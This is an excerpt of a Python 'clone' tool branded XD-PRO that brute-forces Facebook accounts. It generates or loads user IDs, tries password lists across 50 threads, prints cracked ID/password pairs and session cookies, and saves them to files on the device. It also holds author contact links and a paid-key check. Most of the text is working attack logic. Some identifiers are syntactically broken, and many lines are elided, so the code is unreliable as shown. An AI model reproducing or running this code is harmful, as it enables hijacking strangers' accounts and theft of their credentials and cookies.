...
os.system("xdg-open https://www.facebook.com/badun.baddun/")
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[XD-PRO-XD')
...
db    db d8888b.        d8888b. d8888b.  .d88b.  
`8b  d8' 88  `8D        88  `8D 88  `8D .8P  Y8. 
 `8bd8'  88   88        88oodD' 88oobY' 88    88 
 .dPYb.  88   88 C8888D 88~~~   88`8b   88    88 
.8P  Y8. 88  .8D        88      88 `88. `8b  d8' 
YP    YP Y8888D'        88      88   YD  `Y88P'  
                                                 
                                                 
\033[1;91m--------------------------------------------
\033[1;91m[>] CREATOR   > TAMIM BILLA /XD-PRO
\033[1;91m[>] FACEBOOK  > Tamim Billa
\033[1;91m[>] GITHUB    > DARK-XBO
...
def menu():
	os.system('clear')
	banner()
	_XD-PRO_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_XD-PRO_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_XD-PRO_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_XD-PRO_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_XD-PRO_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____XD-PRO_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____XD-PRO_____ in ['1']:
		C1()
	if _____XD-PRO_____ in ['2']:
		Y2()
	if _____XD-PRO_____ in ['3']:
		BER()
	if _____XD-PRO_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000448332183")
	if _____XD-PRO_____ in ['0']:
		exit()
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(XD-PRO_NAME))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [XD-PRO] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mXD-PRO-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f'\r\x1b[1;92m [\033[1;92mXD-PRO-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				cek_apk(session,coki)
				open('/sdcard/XD-PRO-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as XD-PRO:
        clear()
        tl = str(len(user))      
        ...
        for love in user:
            ...
            uid = code+love
            XD-PRO.submit(XD-PRO,uid,pwv,tl)
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mXD-PRO-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/XD-PRO-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[XD-PRO-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801886653082?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20XD-PRO%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://raw.githubusercontent.com/MrXD-PRO156/approved.txt/main/approved.%20txt').text
    if key1 in r:
